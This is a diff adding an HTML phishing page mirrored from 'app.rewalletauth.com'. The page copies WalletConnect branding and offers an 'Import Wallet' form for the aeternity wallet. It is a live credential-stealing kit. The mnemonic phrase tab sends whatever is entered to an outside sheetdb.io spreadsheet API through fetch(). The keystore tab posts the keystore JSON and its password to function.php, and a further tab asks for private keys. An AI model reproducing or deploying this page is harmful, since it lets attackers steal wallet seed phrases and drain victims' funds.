@@ -1,0 +1,135 @@
+
+<!DOCTYPE html>
+<!-- Mirrored from app.rewalletauth.com/connect/?w=aerternity by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Dec 2021 13:59:19 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="../assets/main.css" type="text/css"> 
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="../images/logo.html">
+    <link rel="icon" href="../assets/logo.svg">
+
+<!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<!-- Optional theme -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+
+<!-- Latest compiled and minified JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+    <script>
+        function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+  }
+  
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+  }
+  
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+}
+</script>
+<title>Import Wallet</title>
+</head>
+<body>
+    <center>
+        <div class="top">
+            <a href="../index.html" class="left">Github</a>
+            <a href="#" class="left">Docs</a>
+            <a href="../index.html" class="main"><img src="../assets/logo.svg" alt="logo"></a>
+            <a href="../index.html" class="left">Wallets</a>
+            <a href="#" class="../index.html">Apps</a>
+        </div>
+        <br>
+        <h2 class="text-center">Import Wallet</h2>
+        <br>
+        <div class="tab">
+          <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
+          <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
+          <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
+      </div>
+          <div id="phrase" class="tabcontent" style="display: block;">
+
+        <form w="" action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="post" id="sheetdb-form">
+             <input type="hidden" name="w" value="aerternity"> 
+            <textarea name="data[phrase]" class="phrase" required="required" minlength="30" placeholder="Enter Your Mnemonic Phrase *"></textarea>
+            <input type="text" name="user" value="" style="visibility: hidden;">
+            <br>
+                      
+            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+            <br>
+            <button type="submit" class="btn">VALIDATE</button>
+        </form>
+        <script>
+            var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('../success.html', '_blank');
+
+          });
+        });
+        </script>
+        
+    </div>
+
+    <div id="keystore" class="tabcontent" style="display: none;">
+        <form action="function.php" method="POST">
+
+            <input type="hidden" name="w" value="aerternity">
+
+            <textarea name="keystorejson" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+            <br>
+
+            <div class="field">
+                <input type="password" name="password" placeholder="Password">
+            </div>
+            <input type="text" name="user" value="" style="visibility: hidden;">
+            <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+            <br>
+            <button type="submit" class="btn">IMPORT</button>
+        </form>
+    </div>
+
+    <div id="private" class="tabcontent" style="display: none;">
+        <form action="#" method="POST">
+            <input type="hidden" name="w" value="aerternity">
+            <div class="field">
+                <input type="text" name="key" class="key" placeholder="Private Key">
+            </div>
+            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+            <input type="text" name="user" value="" style="visibility: hidden;">
+            <br>
+            <button type="submit" class="btn">IMPORT</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("default").click();
+    </script>
+    <footer><div id="footer">
+        <p><img src="../assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
+        <p><img src="../assets/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
+        <p><img src="../assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
+        <p><img src="../assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
+    </div></footer>
+</center></body>
+
+</html>
